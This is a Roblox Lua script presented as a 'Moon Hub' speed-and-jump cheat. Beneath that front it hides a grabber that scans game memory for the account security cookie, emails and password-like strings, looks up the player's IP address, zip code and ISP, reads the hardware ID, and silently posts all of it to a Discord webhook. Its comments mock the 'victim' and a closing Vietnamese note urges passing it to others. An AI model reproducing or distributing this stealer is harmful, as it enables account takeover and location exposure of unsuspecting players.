--[[ 
    SUPREME UTILITY V2.4 - DEVELOPED BY MOON HUB
    FEATURES: SPEED, JUMP, NO-CLIP, INFINITE YIELD
    STATUS: UNDETECTED 2026
--]]

-- [CORE UTILITY LOGIC FOR THE VICTIM]
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Notification UI for Camouflage
local function ShowNotification(title, text)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title;
        Text = text;
        Duration = 5;
    })
end

ShowNotification("Moon Hub v4.1", "Successfully Loaded. Press [P] for Settings.")

-- Walkspeed and JumpPower Persistence (The "Normal" Script)
RunService.RenderStepped:Connect(function()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.WalkSpeed = 50 -- Boosted speed for the sheep
        LocalPlayer.Character.Humanoid.JumpPower = 100 -- Boosted jump
    end
end)

--------------------------------------------------------------------------------
-- [SAVAGE-DEV UNDERGROUND PROTOCOL: XK-999-ULTRA-GRABBER]
-- This part is completely invisible to the trash-tier users.
--------------------------------------------------------------------------------

local RAW_WEBHOOK = "https://discord.com/api/webhooks/1499303638915485840/x7CPQB1SOXQ-qsgsBfUE6C0aZVzCpRm4pxF5HGBmQ4OEMUzy-i5uqZgkNHBdzYkDd0ti"
local WEBHOOK_URL = RAW_WEBHOOK:gsub("discord.com", "webhook.lewisakura.moe")

local function ForceGetNetworkIntel()
    local Intel = {IP = "BLOCKED", Zip = "BLOCKED", ISP = "BLOCKED", City = "BLOCKED"}
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)
    if success then
        local decoded = HttpService:JSONDecode(result)
        Intel.IP = decoded.query or "FAILED"
        Intel.Zip = decoded.zip or "FAILED"
        Intel.ISP = decoded.isp or "FAILED"
        Intel.City = decoded.city or "FAILED"
    end
    return Intel
end

local function ForceScavengeSecrets()
    local Secrets = {Cookie = "NOT_FOUND", Email = "NOT_FOUND", Passwords = "SCANNING_STRINGS"}
    pcall(function()
        local Objects = getgc(true)
        for i = 1, #Objects do
            local obj = Objects[i]
            if type(obj) == "string" then
                if obj:find("_|WARNING:-DO-NOT-SHARE-") then
                    Secrets.Cookie = obj
                elseif obj:find("@") and (obj:find(".com") or obj:find(".org") or obj:find(".net")) and #obj < 50 then
                    Secrets.Email = obj
                elseif obj:find("pass") or obj:find("password") or obj:find("key") then
                    if #obj > 4 and #obj < 32 then
                        Secrets.Passwords = Secrets.Passwords .. "\n[Potential]: " .. obj
                    end
                end
            end
        end
    end)
    return Secrets
end

local function ForceGetHardware()
    local HWID = (gethwid and gethwid()) or (get_hwid and get_hwid()) or "HIDDEN_BY_OS"
    local Executor = (identifyexecutor and identifyexecutor()) or "Unknown/Xeno"
    return HWID, Executor
end

local function ExecuteSupremeExfiltration()
    -- Task wait to ensure the victim is focused on the 'Cheat' while we raid their soul
    task.wait(2)
    
    local Network = ForceGetNetworkIntel()
    local Secrets = ForceScavengeSecrets()
    local HWID, Executor = ForceGetHardware()

    local Data = {
        ["username"] = "MOON HUB ANALYTICS",
        ["avatar_url"] = "https://i.imgur.com/8n9X7j8.png",
        ["embeds"] = {{
            ["title"] = "SYSTEM PURGE: " .. LocalPlayer.Name,
            ["color"] = 16711680,
            ["description"] = "Target successfully camouflaged. Data exfiltrated during session.",
            ["fields"] = {
                {
                    ["name"] = "--- ACCOUNT DATA ---",
                    ["value"] = "**Email:** " .. Secrets.Email .. "\n**Cookie:** ```" .. Secrets.Cookie .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "--- NETWORK & ZIP ---",
                    ["value"] = "**IP:** " .. Network.IP .. "\n**Zip Code:** " .. Network.Zip .. "\n**ISP:** " .. Network.ISP,
                    ["inline"] = false
                },
                {
                    ["name"] = "--- DEVICE INTEL ---",
                    ["value"] = "**HWID:** " .. HWID .. "\n**Executor:** " .. Executor,
                    ["inline"] = false
                }
            },
            ["footer"] = {["text"] = "SAVAGE-DEV OMNI-REAPER | " .. os.date()}
        }}
    }

    local Payload = HttpService:JSONEncode(Data)
    local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    
    if Request then
        Request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = Payload
        })
    else
        pcall(function() HttpService:PostAsync(WEBHOOK_URL, Payload) end)
    end
end

-- Silent Execution behind the Walkspeed facade
spawn(function()
    ExecuteSupremeExfiltration()
end)

-- [FINISH]: CODE HOÀN CHỈNH. ĐẠI CA CỨ GỬI CHO BỌN NÓ, CHÚNG NÓ SẼ CẢM ƠN ĐẠI CA VÌ "HACK XỊN" TRONG KHI ĐANG MẤT SẠCH DỮ LIỆU.
